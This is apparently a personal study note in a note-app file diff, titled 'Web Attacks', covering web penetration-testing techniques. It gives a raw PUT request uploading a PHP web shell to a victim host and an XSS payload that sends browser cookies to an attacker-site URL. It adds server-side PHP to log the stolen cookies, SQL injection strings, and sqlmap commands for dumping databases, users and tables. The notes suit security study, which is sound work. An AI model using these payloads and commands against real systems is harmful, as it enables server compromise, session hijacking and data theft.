@@ -1,0 +1,135 @@
+createdAt: "2019-06-29T01:00:47.188Z"
+updatedAt: "2019-06-29T01:45:20.950Z"
+type: "MARKDOWN_NOTE"
+folder: "18f0516133fde417811e"
+title: "Web Attacks"
+tags: []
+content: '''
+  # Web Attacks
+  ## httprint
+  `httprint -P0 -h <ip address> -s /usr/share/httprint/signatures.txt`
+  ## HTTP Verbs
+  * GET
+  * POST
+    * parameters in the body (usr=john&pwd=mypass)
+  * HEAD
+  * PUT
+    * Uploads a file to the server (like a php shell)
+    * Requires filesize (`wc -m payload.php`)
+    * Example (may have to change the `Content-length`)
+   ```
+    nc victim.site 80
+    PUT /payload.php HTTP/1.0
+    Content-type: text/html
+    Content-length:136
+    <?php
+    if (isset($_GET['cmd']))
+    {
+      $cmd = $_GET('cmd');
+      echo '<pre>';
+      $result = shell_exec($cmd);
+      echo $result;
+      echo '</pre>';
+    }
+    ?>
+  ```
+  * DELETE
+  * OPTIONS
+  * TRACE
+  ## Dirbuster
+  website directory mapper
+  Recommend looking for backup files `.bak`, `.old`, `.xxx`, etc.
+  ## Google Hacking
+  In a google search
+  * `site:<searchTerm>`
+  * `inurl:<searchTerm>`
+  * `intitle:<searchTerm>`
+  * `filetype:<extension>
+  * AND, OR, &, |, -`
+  ## Cross Site Scripting (XSS)
+  Tests:
+  * `<script>alert("XSS")</script>`
+  * `<script>alert("XSS")<%2Fscript>`
+  
+  Recflected:
+  * Payload carried inside the request to the vulnerable webserver
+  * Example: when you search and it displays the search terms on the page (but does not store it to a database)
+  
+  Persistent:
+  * Malicious JavaScript is saved in a database and runs when it is displayed to a browser
+  
+  DOM Based:
+  * JavaScript can access cookies if they do not have the `HttpOnly` flag enabled
+  * Example of sending cookies to attacker:
+  ```
+  <script>
+  var i = new Image();
+  i.src="http://attacker.site/log.php?q="+document.cookie;
+  </script>
+  ```
+  * On server
+  ```
+  <?php
+  $filename="/tmp/log.txt";
+  $fp=fopen($filename, 'a');
+  $cookie=$_GET['q'];
+  fwrite($fp, $cookie);
+  fclose($fp);
+  ?>
+  ```
+  * Or alternative server code:
+  ```
+  <?php
+  $ip = $_SERVER['REMOTE_ADDR'];
+  $browser = $_SERVER['HTTP_USER_AGENT'];
+  
+  $fp=fopen(jar.txt, 'a');
+  
+  fwrite($fp, $ip.' '.$browser."\\n");
+  fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\\n\\n");
+  fclose($fp);
+  ?>
+  ```
+  
+  ## SQL Injection
+  Boolean Based:
+  * `SELECT * FROM Table WHERE id=' OR 1=1 -- -`
+  * Want to try a false statement too, in order to see the differences
+  
+  Union Based:
+  * `SELECT * FROM Table WHERE id=' UNION SELECT null; -- -`
+  * Number of fields must match the original query
+    * `UNION SELECT null, null; -- -`
+    * Keep incrementing number of nulls until the error goes away.
+  * See which field is printed to the page and replace that field with: `user()`
+  
+  ### SQLmap
+  `sqlmap -u <URL> -p <injection parameter> [options]`
+  `sqlmap -u <URL> --data=<POST string> -p <parameter> [options] ********`
+  Examples:
+  * basic: `sqlmap -u <URL>`
+  * banner: `sqlmap -u <URL> -b`
+  * tables: `sqlmap -u <URL> --tables`
+  * columns: `sqlmap -u <URL> --current-db <dbName> --columns`
+  * all info: `sqlmap -u <URL> --current-db <dbName> --dump`
+  * union: `sqlmap -u <URL> -p <parameterToTest> --technique=U`
+  * verbose: `sqlmap -u <URL> -v3`
+  * users: `sqlmap -u <URL> -p <parameterToTest> --technique=U --users`
+  * databases: `sqlmap -u <URL> -p <parameterToTest> --technique=U --dbs`
+  * tables: `sqlmap -u <URL> -p <parameterToTest> --technique=U -D <dbName> --tables`
+  * columns: `sqlmap -u <URL> -p <parameterToTest> --technique=U -D <dbName> -T <tableName> --columns`
+  * dump info: `sqlmap -u <URL> -p <parameterToTest> --technique=U -D <dbName> -T <tableName> -C <col1>,<col2>,... --dump
+  * Post forms
+    * Start Burp suite (and capture the post)
+    * `sqlmap -u <URL>/login.php --data='user=a&pass=a' -p user --technique=B --banner`
+    * `sqlmap -u <URL>/login.php --data='user=a&pass=a' -p user --technique=B --dbs`
+    * `sqlmap -u <URL>/login.php --data='user=a&pass=a' -p user --technique=B -D <dbName> --tables`
+    * etc..
+    * Burp suite
+      * Right click on request (copy to file)
+      * `sqlmap -r /path/to/file -p user --technique=B --banner`
+      * /usr/share/sqlmap/output/<domainName>/
+'''
+linesHighlighted: []
+isStarred: false
+isTrashed: false
